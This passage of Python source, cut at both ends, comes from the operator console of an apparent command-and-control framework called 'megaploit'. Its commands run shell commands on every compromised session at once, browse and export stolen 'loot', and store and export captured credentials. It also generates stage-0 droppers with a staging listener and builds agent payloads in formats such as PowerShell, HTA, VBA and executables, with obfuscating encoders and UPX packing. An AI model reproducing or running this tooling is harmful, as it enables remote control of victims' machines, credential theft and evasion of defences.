        print(_box_bot())
        if p.commands:
            print(_section("Commands"))
            for pc in p.commands:
                tag      = _c("  [dangerous]", _RED) if pc.dangerous else ""
                kind_col = _c(f"[{pc.kind}]", _YELLOW)
                fmt_col  = _c(f"[{pc.output_format}]", _DIM) if pc.output_format != "raw" else ""
                print(f"  {_c(pc.usage or pc.name, _GREEN):<{30 + 9}}  {kind_col}{fmt_col}  {_c(pc.description, _GREY)}{tag}")
        print()

    def _plugins_enable(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: plugins enable <name>"))
            return
        name = args[0]
        if _plugin_loader.enable(name):
            _plugin_loader.save_state()
            print(ok(f"Plugin '{name}' enabled."))
        else:
            print(err(f"Plugin '{name}' not found."))

    def _plugins_disable(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: plugins disable <name>"))
            return
        name = args[0]
        if _plugin_loader.disable(name):
            _plugin_loader.save_state()
            print(ok(f"Plugin '{name}' disabled."))
        else:
            print(err(f"Plugin '{name}' not found."))

    def _plugins_load(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: plugins load <file-path|url>"))
            return
        target = args[0]
        if target.startswith("http://") or target.startswith("https://"):
            print(info(f"Downloading plugin from {target}…"))
            ok_flag, error = _plugin_loader.load_url(target)
            if ok_flag:
                print(ok(f"Plugin loaded from URL."))
            else:
                print(err(f"Load failed: {error}"))
        elif target.endswith(".zip"):
            try:
                loaded, errors = _plugin_loader.load_zip(target)
                print(ok(f"Loaded {loaded} plugin(s) from ZIP ({errors} errors)."))
            except Exception as e:
                print(err(str(e)))
        else:
            ok_flag, error = _plugin_loader.load_file(target)
            if ok_flag:
                print(ok(f"Plugin loaded: {target}"))
            else:
                print(err(f"Load failed: {error}"))

    def _plugins_watcher(self, args: list[str]) -> None:
        if not args:
            s = _plugin_loader.status()
            state = _c("running", _GREEN) if s["watcher_running"] else _c("stopped", _GREY)
            print(info(f"Plugin watcher is {state}."))
            print(info(f"Usage: plugins watcher on|off"))
            return
        sub = args[0].lower()
        if sub in ("on", "start"):
            _plugin_loader.start_watcher(
                on_reload=lambda l, e: print(
                    ok(f"Plugin hot-reload: {l} loaded, {e} errors")
                )
            )
            self._watcher_enabled = True
            self._save_settings_to_disk()
            print(ok("Plugin hot-reload watcher started."))
        elif sub in ("off", "stop"):
            _plugin_loader.stop_watcher()
            self._watcher_enabled = False
            self._save_settings_to_disk()
            print(ok("Plugin hot-reload watcher stopped."))
        else:
            print(err(f"Unknown watcher sub-command: {sub}  (use on|off)"))

    def _plugins_deps(self, args: list[str]) -> None:
        sub = args[0].lower() if args else "list"
        if sub == "list":
            missing = _plugin_loader.missing_deps()
            if not missing:
                print(ok("All plugin dependencies are satisfied."))
                return
            print()
            for md in missing:
                print(f"  {_c('✗', _RED)} {_c(md.plugin_name, _CYAN)}  needs  {_c(md.package, _YELLOW)}")
                print(f"      hint: {_c(md.install_hint(), _GREY)}")
            print()
        elif sub == "install":
            missing = _plugin_loader.missing_deps()
            if not missing:
                print(ok("Nothing to install."))
                return
            print(info(f"Installing {len(missing)} package(s)…"))
            results = _plugin_loader.install_missing_deps()
            for pkg, success in results.items():
                if success:
                    print(ok(f"  {pkg} installed."))
                else:
                    print(err(f"  {pkg} failed."))
        else:
            print(err(f"Unknown deps sub-command: {sub}  (use list|install)"))

    # ---------------------------------------------------------------
    # NEW: Loot browser
    # ---------------------------------------------------------------

    def _cmd_loot(self, args: list[str]) -> None:
        sub = args[0].lower() if args else "browse"

        if sub in ("browse", "ls", "list"):
            summary = _loot_summary()
            if not summary:
                print(info("No loot collected yet.  Loot is saved to  loot/"))
                return
            print()
            print(_box_top("Loot Browser"))
            total = sum(summary.values())
            print(_box_row(_kv("Total files", str(total))))
            print(_box_row(_kv("Location",    _c("loot/", _CYAN))))
            print(_box_bot())
            print(_section("Directories"))
            for dirname, count in sorted(summary.items()):
                bar_len = min(int(count / max(total, 1) * 30), 30)
                bar = _c("█" * bar_len, _CYAN) + _c("░" * (30 - bar_len), _GREY)
                count_str = _c(str(count).rjust(5), _WHITE)
                print(f"  {_c(dirname, _CYAN):<{30 + 9}}  {bar}  {count_str} files")
            print()
            print(f"  {_c('Tree:', _GREY)} loot browse  {_c('Export:', _GREY)} loot export <dir> <file.zip>")
            print()

        elif sub == "tree":
            path = os.path.join("loot", args[1]) if len(args) > 1 else "loot"
            if not os.path.isdir(path):
                print(err(f"Directory not found: {path}"))
                return
            print()
            print(_c(f"  {path}/", _CYAN, _BOLD))
            _print_loot_tree(path)
            print()

        elif sub == "export":
            if len(args) < 3:
                print(err("Usage: loot export <subdir> <output.zip>"))
                return
            src_dir = os.path.join("loot", args[1])
            out_zip = args[2]
            if not os.path.isdir(src_dir):
                print(err(f"Directory not found: {src_dir}"))
                return
            import zipfile
            with zipfile.ZipFile(out_zip, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, _dirs, files in os.walk(src_dir):
                    for fname in files:
                        full = os.path.join(root, fname)
                        arcname = os.path.relpath(full, "loot")
                        zf.write(full, arcname)
            size = os.path.getsize(out_zip)
            print(ok(f"Exported to {_c(out_zip, _CYAN)}  ({_human_size(size)})"))

        elif sub == "clear":
            loot_root = "loot"
            if not os.path.isdir(loot_root):
                print(info("No loot directory found."))
                return
            print(_c("  ⚠  Delete ALL files in loot/? This cannot be undone.", _YELLOW, _BOLD))
            confirm = input(_c("     Type YES to confirm: ", _YELLOW)).strip()
            if confirm != "YES":
                print(warn("Cancelled."))
                return
            shutil.rmtree(loot_root, ignore_errors=True)
            os.makedirs(loot_root, exist_ok=True)
            print(ok("loot/ cleared."))

        else:
            print(err(f"Unknown loot sub-command: {sub}  (browse|tree|export|clear)"))

    # ---------------------------------------------------------------
    # NEW: Engagement metadata
    # ---------------------------------------------------------------

    def _cmd_engagement(self, args: list[str]) -> None:
        if not args or args[0].lower() == "show":
            # Show current engagement info
            duration = int(time.time() - self.engagement_start)
            h, rem   = divmod(duration, 3600)
            m, s     = divmod(rem, 60)
            dur_str  = f"{h:02d}:{m:02d}:{s:02d}"
            print()
            print(_box_top("Engagement"))
            print(_box_row(_kv("Name",        _c(self.engagement_name or "(not set)", _CYAN if self.engagement_name else _DIM))))
            print(_box_row(_kv("Description", self.engagement_desc[:58] or "(none)")))
            print(_box_row(_kv("Running for", _c(dur_str, _WHITE))))
            with self._sessions_lock:
                n = len(self._sessions)
            print(_box_row(_kv("Sessions",    _c(str(n), _GREEN if n else _GREY))))
            loot_sum = _loot_summary()
            total_loot = sum(loot_sum.values())
            print(_box_row(_kv("Loot files",  _c(str(total_loot), _CYAN))))
            print(_box_bot())
            print()
            return

        sub = args[0].lower()
        rest = " ".join(args[1:])

        if sub in ("name", "set-name"):
            if not rest:
                print(err("Usage: engagement name <name>"))
                return
            self.engagement_name = rest
            self._save_settings_to_disk()
            print(ok(f"Engagement name  →  {_c(rest, _CYAN)}"))

        elif sub in ("desc", "description", "set-desc"):
            if not rest:
                print(err("Usage: engagement desc <description>"))
                return
            self.engagement_desc = rest
            self._save_settings_to_disk()
            print(ok(f"Engagement description updated."))

        elif sub == "export":
            # Export engagement summary as JSON
            path = rest or "engagement.json"
            with self._sessions_lock:
                sessions_data = [s.to_dict() for s in self._sessions.values()]
            data = {
                "name":        self.engagement_name,
                "description": self.engagement_desc,
                "started":     datetime.datetime.fromtimestamp(
                    self.engagement_start, tz=datetime.timezone.utc
                ).isoformat(),
                "sessions":    sessions_data,
                "loot":        _loot_summary(),
            }
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
            print(ok(f"Engagement exported to {_c(path, _CYAN)}"))

        elif sub == "reset":
            self.engagement_name  = ""
            self.engagement_desc  = ""
            self.engagement_start = time.time()
            self._save_settings_to_disk()
            print(ok("Engagement reset."))
        else:
            print(err(f"Unknown engagement sub-command: {sub}"))
            print(info("Usage: engagement [show|name <n>|desc <d>|export [path]|reset]"))

    # ---------------------------------------------------------------
    # NEW: Broadcast
    # ---------------------------------------------------------------

    def _cmd_broadcast(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: broadcast <shell-command>"))
            return
        cmd_str = " ".join(args)
        with self._sessions_lock:
            targets = list(self._sessions.values())
        if not targets:
            print(warn("No active sessions."))
            return
        print(info(f"Broadcasting to {len(targets)} session(s): {_c(cmd_str, _CYAN)}"))
        for sess in targets:
            result: CommandResult = dispatch(sess, cmd_str)
            prefix = _c(f"[#{sess.id} {sess.ip}]", _CYAN, _BOLD)
            if result.ok:
                # truncate long output
                out = result.output[:400] + ("…" if len(result.output) > 400 else "")
                print(f"{prefix} {out}")
            else:
                print(f"{prefix} {_c('error', _RED)}: {result.output[:200]}")
        print()

    # ---------------------------------------------------------------
    # NEW: Command aliases
    # ---------------------------------------------------------------

    def _cmd_alias(self, args: list[str]) -> None:
        if len(args) < 2:
            print(err("Usage: alias <name> <command>"))
            print(info("Example:  alias sc screenshot"))
            return
        name = args[0].lower()
        cmd  = " ".join(args[1:])
        self._aliases[name] = cmd
        self._save_settings_to_disk()
        print(ok(f"alias  {_c(name, _CYAN)}  →  {_c(cmd, _WHITE)}"))

    def _cmd_unalias(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: unalias <name>"))
            return
        name = args[0].lower()
        if name in self._aliases:
            del self._aliases[name]
            self._save_settings_to_disk()
            print(ok(f"Alias '{name}' removed."))
        else:
            print(err(f"No alias named '{name}'."))

    def _cmd_aliases_list(self) -> None:
        if not self._aliases:
            print(info("No aliases defined.  Create one with:  alias <name> <command>"))
            return
        print()
        print(_c(f"  {'ALIAS':<16}  EXPANDS TO", _BOLD, _WHITE))
        print(_rule("─", width=50))
        for name, cmd in sorted(self._aliases.items()):
            print(f"  {_c(name, _CYAN):<{16 + 9}}  {_c(cmd, _WHITE)}")
        print()

    # ---------------------------------------------------------------
    # NEW: Command history
    # ---------------------------------------------------------------

    def _cmd_history(self, args: list[str]) -> None:
        sub = args[0].lower() if args else "tail"
        rest = args[1:] if len(args) > 1 else []

        if sub == "clear":
            _cmd_history.clear()
            print(ok("History cleared."))
            return

        if sub == "search":
            if not rest:
                print(err("Usage: history search <query>"))
                return
            q = " ".join(rest)
            results = _cmd_history.search(q)
            if not results:
                print(info(f"No history matches: {_c(repr(q), _YELLOW)}"))
                return
            print()
            for e in results[-50:]:
                ctx = _c(f"[{e['context']}]", _DIM)
                print(f"  {_c(e['ts'], _GREY)}  {ctx}  {e['cmd']}")
            print()
            return

        # Default: show last N entries
        n = 20
        if sub.isdigit():
            n = int(sub)
        elif sub == "tail":
            n = int(rest[0]) if rest and rest[0].isdigit() else 20
        entries = _cmd_history.tail(n)
        if not entries:
            print(info("No history yet."))
            return
        print()
        print(_c(f"  {'TIME':<22}  {'CTX':<10}  COMMAND", _BOLD, _WHITE))
        print(_rule("─", width=70))
        for e in entries:
            ts  = _c(e["ts"], _GREY)
            ctx = _c(f"[{e['context']}]", _DIM)
            cmd_str = e["cmd"][:60] + ("…" if len(e["cmd"]) > 60 else "")
            print(f"  {ts}  {ctx:<{10 + 9}}  {cmd_str}")
        print()

    # ---------------------------------------------------------------
    # NEW: Env probe
    # ---------------------------------------------------------------

    def _cmd_env_probe(self, args: list[str]) -> None:
        """Probe the operator's toolchain and display the environment snapshot."""
        print(info("Probing toolchain…"))
        try:
            snapshot = _installer.env_probe.probe()
        except Exception as e:
            print(err(f"Probe failed: {e}"))
            return
        print()
        print(_box_top("Environment Snapshot"))
        print(_box_row(_kv("OS",       _c(f"{snapshot.os_name} {snapshot.os_version}", _WHITE))))
        print(_box_row(_kv("Python",   _c(snapshot.python_version, _CYAN))))
        print(_box_row(_kv("Shell",    _c(snapshot.shell or "(unknown)", _GREY))))
        langs = ", ".join(snapshot.langs_supported()) or "(none detected)"
        print(_box_row(_kv("Languages", _c(langs, _GREEN))))
        print(_box_bot())
        if snapshot.tools:
            print(_section("Detected Tools"))
            for name, ver in sorted(snapshot.tools.items()):
                found_col = _c(ver or "✓", _GREEN) if ver is not None else _c("✗", _RED)
                print(f"  {_c(name, _CYAN):<{20 + 9}}  {found_col}")
        print()

    # ---------------------------------------------------------------
    # NEW: Workspace alias at global level (delegates to toolbox)
    # ---------------------------------------------------------------

    def _cmd_workspace(self, args: list[str]) -> None:
        """Alias: workspace <sub>  →  toolbox workspace <sub>"""
        self._toolbox_workspace(args)

    # ---------------------------------------------------------------
    # Module system commands
    # ---------------------------------------------------------------

    def _cmd_use_module(self, args: list[str]) -> None:
        """Load a module by name path:  use auxiliary/scanner/tcp_port"""
        name = args[0] if args else ""
        entry = _module_registry.get(name)
        if entry is None:
            print(err(f"Module not found: {_c(name, _BOLD)}"))
            print(info("  Try:  show modules  or  show modules <query>"))
            return
        self._active_module      = entry.instantiate()
        self._active_module_name = entry.name
        opts = self._active_module.options()
        if "LHOST" in opts and self.lhost:
            try:
                self._active_module.set("LHOST", self.lhost)
            except Exception:
                pass
        print()
        print(_box_top(f"Module: {entry.name}", color=_MAGENTA))
        print(_box_row(_kv("Type",        _c(entry.module_type.value, _CYAN)),  color=_MAGENTA))
        print(_box_row(_kv("Description", entry.description[:56]),               color=_MAGENTA))
        print(_box_row(_kv("Author",      entry.author),                         color=_MAGENTA))
        print(_box_row(_kv("Rank",        str(entry.rank)),                      color=_MAGENTA))
        print(_box_bot(color=_MAGENTA))
        print()
        self._cmd_module_options()
        print(f"  {_c('setopt <OPT> <val>', _CYAN)}  /  {_c('run', _CYAN)}  /  "
              f"{_c('check', _CYAN)}  /  {_c('back', _CYAN)}")
        print()

    def _cmd_setoption(self, args: list[str]) -> None:
        """setopt <OPTION> <value>  — set option on active module."""
        if self._active_module is None:
            print(err("No active module.  Use:  use <module/name>"))
            return
        if len(args) < 2:
            print(err("Usage: setopt <OPTION> <value>"))
            return
        key = args[0]
        val = " ".join(args[1:])
        try:
            self._active_module.set(key, val)
            print(ok(f"{_c(key.upper(), _YELLOW)}  →  {_c(val, _WHITE)}"))
        except _ModuleError as exc:
            print(err(str(exc)))

    def _cmd_module_options(self) -> None:
        """Print the options table for the active module."""
        if self._active_module is None:
            print(err("No active module.  Use:  use <module/name>"))
            return
        opts = self._active_module.options()
        if not opts:
            print(info("  This module has no configurable options."))
            return
        print()
        hdr = f"  {'Option':<18}  {'Type':<10}  {'Value':<24}  {'Req':<5}  Description"
        print(_c(hdr, _BOLD, _WHITE))
        print(_rule("─", width=90))
        for name, opt in opts.items():
            val_str  = str(opt.value) if opt.value is not None else _c("(not set)", _DIM)
            req_str  = _c("yes", _RED) if opt.required else _c("no", _DIM)
            kind_str = _c(opt.kind.value, _GREY)
            print(
                f"  {_c(name, _YELLOW):<{18+9}}  {kind_str:<{10+9}}  "
                f"{val_str:<{24}}  {req_str:<{5+9}}  "
                f"{_c(opt.description[:40], _DIM)}"
            )
        print()

    def _cmd_module_run(self, args: list[str]) -> None:
        """Execute the active module."""
        if self._active_module is None:
            print(err("No active module.  Use:  use <module/name>"))
            return
        try:
            self._active_module.validate()
        except _ModuleError as exc:
            print(err(f"Validation failed: {exc}"))
            return
        print(info(f"Running module: {_c(self._active_module_name, _CYAN)}"))
        print(_rule("─", width=60))

        def _cb(msg: str) -> None:
            if msg.startswith("[+]"):
                print(ok(msg[4:]))
            elif msg.startswith("[-]"):
                print(err(msg[4:]))
            elif msg.startswith("[*]"):
                print(info(msg[4:]))
            else:
                print(f"  {msg}")

        self._active_module.set_output_callback(_cb)
        stop_mod = self._active_module
        done_flag = threading.Event()

        def _run_thread() -> None:
            try:
                stop_mod.run()
            except Exception as exc:
                print(err(f"Module error: {exc}"))
            finally:
                done_flag.set()

        t = threading.Thread(target=_run_thread, daemon=True)
        t.start()
        try:
            t.join()
        except KeyboardInterrupt:
            stop_mod.stop()
            print()
            print(warn("  Module interrupted — waiting for threads…"))
            t.join(timeout=5)

        results  = stop_mod.results
        ok_cnt   = sum(1 for r in results if r.ok)
        fail_cnt = len(results) - ok_cnt
        print(_rule("─", width=60))
        print(ok(f"  {ok_cnt} result(s)") + "  " + (_c(f"{fail_cnt} failed", _RED) if fail_cnt else ""))
        print()

    def _cmd_module_check(self, args: list[str]) -> None:
        """Run check() on the active module."""
        if self._active_module is None:
            print(err("No active module."))
            return
        try:
            result = self._active_module.check()
            if result is None:
                print(info("  check() not implemented for this module."))
            else:
                print(ok(f"  {result}"))
        except Exception as exc:
            print(err(f"  check() raised: {exc}"))

    def _cmd_module_info(self, args: list[str]) -> None:
        """Show info for active module or named module."""
        if args:
            entry = _module_registry.get(args[0])
            if entry is None:
                print(err(f"Module not found: {args[0]}"))
                return
            mod = entry.instantiate()
        elif self._active_module:
            mod = self._active_module
        else:
            print(err("No active module and no name given."))
            return
        d = mod.info()
        print()
        print(_box_top(f"Module Info: {d['name']}", color=_CYAN))
        for k, v in (
            ("Name",        d["name"]),
            ("Type",        d["type"]),
            ("Description", d["description"]),
            ("Author",      d["author"]),
            ("Rank",        str(d["rank"])),
            ("Platform",    ", ".join(d["platform"]) or "any"),
            ("Arch",        ", ".join(d["arch"]) or "any"),
        ):
            print(_box_row(_kv(k, v), color=_CYAN))
        for ref in d.get("references", []):
            print(_box_row(_kv("Ref", ref), color=_CYAN))
        print(_box_bot(color=_CYAN))
        print()
        opts = d.get("options", {})
        if opts:
            print(_c(f"  {'Option':<18}  {'Type':<10}  {'Default':<18}  Description", _BOLD, _WHITE))
            print(_rule("─", width=80))
            for oname, oinfo in opts.items():
                dval = str(oinfo["default"]) if oinfo["default"] is not None else ""
                print(
                    f"  {_c(oname, _YELLOW):<{18+9}}  "
                    f"{_c(oinfo['kind'], _GREY):<{10+9}}  "
                    f"{dval:<18}  "
                    f"{_c(oinfo['description'][:42], _DIM)}"
                )
            print()

    def _cmd_show(self, args: list[str]) -> None:
        """show modules [query|type]"""
        if not args or args[0].lower() == "modules":
            query   = " ".join(args[1:]) if len(args) > 1 else ""
            entries = _module_registry.search(query) if query else _module_registry.all()
            if query:
                print(info(f"  Search: {_c(query, _WHITE)}  — {len(entries)} match(es)"))
            if not entries:
                print(warn("  No modules loaded."))
                return
            print()
            print(_c(f"  {'Name':<44}  {'Type':<12}  {'Rank':<6}  Description", _BOLD, _WHITE))
            print(_rule("─", width=90))
            for e in entries:
                tstr = _c(e.module_type.value, _CYAN)
                desc = e.description[:36] + ("…" if len(e.description) > 36 else "")
                print(
                    f"  {_c(e.name, _WHITE):<{44+9}}  "
                    f"{tstr:<{12+9}}  "
                    f"{_c(str(e.rank), _DIM):<6}  "
                    f"{_c(desc, _GREY)}"
                )
            print()
        else:
            print(err("Usage: show modules [query]"))

    # ---------------------------------------------------------------
    # Jobs command (stub until Sprint 5a jobs engine is wired)
    # ---------------------------------------------------------------

    def _cmd_jobs(self, args: list[str]) -> None:
        """jobs [list|kill <id>]"""
        try:
            from megaploit.core.jobs import job_manager
        except ImportError:
            print(warn("  Jobs engine not yet initialised."))
            return
        sub = args[0].lower() if args else "list"
        if sub == "list":
            jobs = job_manager.list_jobs()
            if not jobs:
                print(info("  No background jobs running."))
                return
            print()
            print(_c(f"  {'ID':<6}  {'Name':<28}  {'Status':<10}  Started", _BOLD, _WHITE))
            print(_rule("─", width=70))
            for j in jobs:
                stat_col = _c(j["status"], _GREEN if j["status"] == "running" else _GREY)
                print(
                    f"  {_c(str(j['id']), _CYAN):<{6+9}}  {j['name']:<28}  "
                    f"{stat_col:<{10+9}}  {_c(j.get('started', ''), _DIM)}"
                )
            print()
        elif sub == "kill" and len(args) > 1:
            job_manager.kill(args[1])
            print(ok(f"  Sent stop signal to job {_c(args[1], _CYAN)}"))
        else:
            print(info("  Usage: jobs [list|kill <id>]"))

    # ---------------------------------------------------------------
    # Credential store command
    # ---------------------------------------------------------------

    def _cmd_creds(self, args: list[str]) -> None:
        """creds [show|search <q>|export <file>|clear]"""
        try:
            from megaploit.db.database import db
        except ImportError:
            print(warn("  Database not available."))
            return
        sub = args[0].lower() if args else "show"
        if sub == "show":
            rows = db.get_credentials()
            if not rows:
                print(info("  No credentials stored."))
                return
            print()
            print(_c(f"  {'ID':<5}  {'Host':<18}  {'Username':<16}  {'Type':<12}  Secret (truncated)", _BOLD, _WHITE))
            print(_rule("─", width=85))
            for row in rows:
                sec = (row.get("secret") or "")[:30] + ("…" if len(row.get("secret") or "") > 30 else "")
                print(
                    f"  {_c(str(row.get('id','')), _CYAN):<{5+9}}  "
                    f"{(row.get('host') or ''):<18}  "
                    f"{(row.get('username') or ''):<16}  "
                    f"{_c((row.get('cred_type') or ''), _GREY):<{12+9}}  "
                    f"{_c(sec, _DIM)}"
                )
            print()
        elif sub == "search" and len(args) > 1:
            query = " ".join(args[1:])
            rows  = db.search_credentials(query)
            print(info(f"  {len(rows)} match(es) for {_c(query, _WHITE)}"))
            for row in rows:
                print(f"  {row.get('username','?')}@{row.get('host','?')}  [{row.get('cred_type','?')}]")
        elif sub == "export" and len(args) > 1:
            path = args[1]
            rows = db.get_credentials()
            try:
                with open(path, "w", encoding="utf-8") as f:
                    json.dump(rows, f, indent=2)
                print(ok(f"  {len(rows)} cred(s) exported to {_c(path, _CYAN)}"))
            except OSError as exc:
                print(err(f"  Export failed: {exc}"))
        elif sub == "clear":
            confirm = input(_c("  Type YES to clear all credentials: ", _YELLOW)).strip()
            if confirm == "YES":
                db.clear_credentials()
                print(ok("  Credential store cleared."))
            else:
                print(warn("  Cancelled."))
        else:
            print(info("  Usage: creds [show|search <q>|export <file>|clear]"))

    # ---------------------------------------------------------------
    # Report command
    # ---------------------------------------------------------------

    def _cmd_report(self, args: list[str]) -> None:
        """report [html|json] [output_path]"""
        try:
            from megaploit.reporting.report import generate_report
        except ImportError:
            print(warn("  Report engine not available."))
            return
        fmt = args[0].lower() if args else "html"
        out = args[1] if len(args) > 1 else f"report_{int(time.time())}.{fmt}"
        with self._sessions_lock:
            sessions = list(self._sessions.values())
        try:
            generate_report(
                output_path=out,
                fmt=fmt,
                engagement_name=self.engagement_name,
                engagement_desc=self.engagement_desc,
                engagement_start=self.engagement_start,
                sessions=sessions,
            )
            print(ok(f"  Report written to {_c(out, _CYAN)}"))
        except Exception as exc:
            print(err(f"  Report generation failed: {exc}"))

    # ---------------------------------------------------------------
    # AutoRun command
    # ---------------------------------------------------------------

    def _cmd_autorun(self, args: list[str]) -> None:
        """autorun [show|reload|save-default|test <session_id>]"""
        sub = args[0].lower() if args else "show"
        if sub == "show":
            summary = _autorun.summary()
            print()
            print(_box_top("AutoRunScript Configuration", color=_CYAN))
            print(_box_row(_kv("Config file", summary["path"]), color=_CYAN))
            for key in ("global", "windows", "linux", "darwin"):
                val = ", ".join(summary[key]) or _c("(none)", _DIM)
                print(_box_row(_kv(key.capitalize(), val), color=_CYAN))
            if summary["tags"]:
                for tag, cmds in summary["tags"].items():
                    print(_box_row(_kv(f"tag:{tag}", ", ".join(cmds)), color=_CYAN))
            print(_box_bot(color=_CYAN))
            print()
        elif sub == "reload":
            _autorun.reload()
            print(ok("  AutoRunScript config reloaded."))
        elif sub == "save-default":
            _autorun.save_default()
            print(ok(f"  Default config written to {_c(_autorun._path, _CYAN)}"))
        elif sub == "test" and len(args) > 1:
            if not args[1].isdigit():
                print(err("Usage: autorun test <session_id>"))
                return
            sid = int(args[1])
            with self._sessions_lock:
                sess = self._sessions.get(sid)
            if not sess:
                print(err(f"No session #{sid}"))
                return
            cmds = _autorun.commands_for(sess)
            print(info(f"  AutoRun for session #{sid} (os={sess.os_name or '?'}, tag={sess.tag or 'none'}):"))
            for c in cmds:
                print(f"  {_c('→', _GREY)} {_c(c, _WHITE)}")
            if not cmds:
                print(_c("  (no commands configured)", _DIM))
        else:
            print(info("  Usage: autorun [show|reload|save-default|test <session_id>]"))

    # ---------------------------------------------------------------
    # Post-exploitation pipeline command
    # ---------------------------------------------------------------

    def _cmd_pipeline(self, args: list[str]) -> None:
        """pipeline [status|enable <profile>|disable <profile>|reload|list]"""
        sub = args[0].lower() if args else "status"

        if sub in ("status", "show"):
            summary = _pipeline.summary()
            active  = summary["active_profiles"]
            avail   = summary["available_profiles"]
            print()
            print(_box_top("Post-Exploitation Pipeline", color=_CYAN))
            active_str = (", ".join(_c(p, _GREEN) for p in active)
                          if active else _c("(none)", _DIM))
            print(_box_row(_kv("Active profiles", active_str), color=_CYAN))
            avail_str  = "  ".join(_c(p, _GREY) for p in avail)
            print(_box_row(_kv("Available",       avail_str), color=_CYAN))
            print(_box_bot(color=_CYAN))
            print()

        elif sub == "list":
            print()
            for name in _pipeline.available_profiles():
                active_mark = _c("●", _GREEN) if _pipeline.is_enabled(name) else _c("○", _GREY)
                print(f"  {active_mark} {_c(name, _CYAN)}")
            print()

        elif sub == "enable":
            if len(args) < 2:
                print(err("  Usage: pipeline enable <profile>"))
                return
            name = args[1].lower()
            try:
                _pipeline.enable_profile(name)
                print(ok(f"  Pipeline profile {_c(name, _CYAN)} enabled — active on next session."))
            except KeyError as exc:
                print(err(f"  {exc}"))

        elif sub == "disable":
            if len(args) < 2:
                print(err("  Usage: pipeline disable <profile>"))
                return
            name = args[1].lower()
            _pipeline.disable_profile(name)
            print(ok(f"  Pipeline profile {_c(name, _CYAN)} disabled."))

        elif sub == "reload":
            _pipeline.reload_autorun()
            print(ok("  AutoRun config reloaded into pipeline."))

        else:
            print(info("  Usage: pipeline [status|list|enable <profile>|disable <profile>|reload]"))
            print(f"  Profiles: {', '.join(_pipeline.available_profiles())}")

    # ---------------------------------------------------------------
    # Stage0 command
    # ---------------------------------------------------------------

    def _cmd_stage0(self, args: list[str]) -> None:
        """stage0 generate [--minimal] [--out <file>] [--port N] [--start]
stage0 status | stage0 stop"""
        sub = args[0].lower() if args else "help"

        if sub in ("generate", "gen"):
            if not self.lhost:
                print(err("  Set LHOST first:  set lhost <ip>"))
                return
            minimal   = "--minimal" in args
            out       = None
            stage_port = self.port + 1
            start_srv  = "--start" in args
            i = 1
            while i < len(args):
                if args[i] in ("--out", "-o") and i + 1 < len(args):
                    out = args[i + 1]; i += 2
                elif args[i] in ("--port", "-p") and i + 1 < len(args):
                    try:
                        stage_port = int(args[i + 1])
                    except ValueError:
                        print(err("  --port requires an integer"))
                        return
                    i += 2
                else:
                    i += 1

            from megaploit.core.staging import generate_stage0, StagingServer
            key_hex = self.secret_key.hex() if self.secret_key else "00" * 32
            dropper = generate_stage0(
                lhost=self.lhost,
                port=stage_port,
                key_hex=key_hex,
                use_tls=bool(self.cert),
                minimal=minimal,
            )

            if out:
                with open(out, "w", encoding="utf-8") as f:
                    f.write(dropper)
                print(ok(f"  Stage-0 dropper written to {_c(out, _CYAN)}"))
            else:
                print()
                print(_rule("─", width=60, color=_CYAN))
                print(_c(dropper, _WHITE))
                print(_rule("─", width=60, color=_CYAN))
                print()

            # Optionally start the StagingServer in the background
            if start_srv:
                existing = getattr(self, "_staging_server", None)
                if existing and existing._running:
                    print(warn(f"  Staging server already running on port {existing.port}"))
                else:
                    srv = StagingServer(
                        bind_host=self.bind_host,
                        port=stage_port,
                        secret_key=self.secret_key,
                    )
                    srv.start()
                    self._staging_server = srv
                    print(ok(f"  Staging server listening on {_c(self.bind_host, _CYAN)}:{_c(str(stage_port), _CYAN)}"))
                    print(info(f"  Agents should connect to {_c(self.lhost, _WHITE)}:{_c(str(stage_port), _WHITE)}"))

        elif sub == "status":
            srv = getattr(self, "_staging_server", None)
            if srv and srv._running:
                print(ok(f"  Staging server running on port {_c(str(srv.port), _CYAN)}"))
            else:
                print(info("  Staging server not running.  Use:  stage0 generate --start"))

        elif sub == "stop":
            srv = getattr(self, "_staging_server", None)
            if srv and srv._running:
                srv.stop()
                self._staging_server = None
                print(ok("  Staging server stopped."))
            else:
                print(warn("  Staging server is not running."))

        else:
            print(info("  Usage:"))
            print(f"    {_c('stage0 generate', _CYAN)} [--minimal] [--out <file>] [--port N] [--start]")
            print(f"    {_c('stage0 status', _CYAN)}")
            print(f"    {_c('stage0 stop', _CYAN)}")
            print()
            print(f"  {_c('--start', _YELLOW)}    also launch the staging listener (port = main+1 by default)")
            print(f"  {_c('--minimal', _YELLOW)}  compact one-file dropper (no threading, shorter names)")


    # ---------------------------------------------------------------
    # Payload builder command
    # ---------------------------------------------------------------

    def _cmd_payload(self, args: list[str]) -> None:
        """payload <format> [--out <file>] [--tls] [--encoder <name>] [--obfuscate]

        Formats: py ps1 hta vba sh bat raw exe elf oneliner_py oneliner_ps1

        Examples:
          payload ps1 --out agent.ps1
          payload exe --out agent.exe --upx
          payload oneliner_py
          payload py --encoder comment_spam --encoder varname_rand --out obf.py
        """
        if not args or args[0].lower() in ("help", "--help", "-h"):
            fmts = "  ".join(_OutputFormat)
            print()
            print(info(f"  Usage: payload <format> [options]"))
            print(f"  Formats: {_c(fmts, _CYAN)}")
            print()
            print(f"  Options:")
            print(f"    {_c('--out <file>', _YELLOW):<{20+9}}  Write to file (default: print)")
            print(f"    {_c('--tls', _YELLOW):<{20+9}}  Use TLS in agent")
            print(f"    {_c('--encoder <name>', _YELLOW):<{20+9}}  Apply an encoder (repeatable)")
            print(f"    {_c('--upx', _YELLOW):<{20+9}}  UPX-pack binary (exe/elf only)")
            print()
            print(_c("  Available encoders:", _GREY))
            for enc_name, enc_doc in _encoder_info().items():
                print(f"    {_c(enc_name, _CYAN):<{20+9}}  {_c(enc_doc, _GREY)}")
            print()
            return

        if not self.lhost:
            print(err("  Set LHOST first:  set lhost <ip>"))
            return

        fmt_str  = args[0].lower()
        out_path = ""
        use_tls  = False
        encoders: list[str] = []
        upx_pack = False
        i = 1
        while i < len(args):
            a = args[i]
            if a in ("--out", "-o") and i + 1 < len(args):
                out_path = args[i + 1]; i += 2
            elif a == "--tls":
                use_tls = True; i += 1
            elif a == "--upx":
                upx_pack = True; i += 1
            elif a in ("--encoder", "-e") and i + 1 < len(args):
                enc = args[i + 1].lower()
